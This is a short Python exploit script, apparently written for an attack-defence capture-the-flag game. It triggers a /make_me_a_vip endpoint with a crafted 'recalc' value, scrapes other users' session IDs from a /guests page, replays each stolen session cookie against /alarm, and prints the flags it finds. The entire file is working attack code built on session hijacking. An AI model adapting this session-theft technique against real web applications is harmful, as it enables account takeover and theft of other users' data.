import requests
import re
import sys
import threading

IP = sys.argv[1]
base_url = f'http://{IP}:7353/'
session_regex = '<tr><td>(.*)</td></tr>'
flag_regex = 'ENO[A-Za-z0-9+\/=]{48}'


def nuda_tutto_quanto():
    s = requests.Session()
    r = s.get(f'{base_url}')

    form = {
        'recalc' : 'None'
    }

    r = s.post(f'{base_url}/make_me_a_vip', data = form)


def get_sessions():
    r = requests.get(f'{base_url}/guests')
    r = r.text

    sessions = re.findall(session_regex, r)

    return sessions


def dump_alarms(session):
    cookies = {
        'session_id' : session
    }

    r = requests.get(f'{base_url}/alarm', cookies = cookies)
    r = r.text

    flags = re.findall(flag_regex, r)

    if len(flags) > 0:
        for f in flags:
            print(f, flush=True)


def main():
    nuda_tutto_quanto()
    s = get_sessions()

    for t in s:
        dump_alarms(t)


if __name__ == '__main__':
    main()
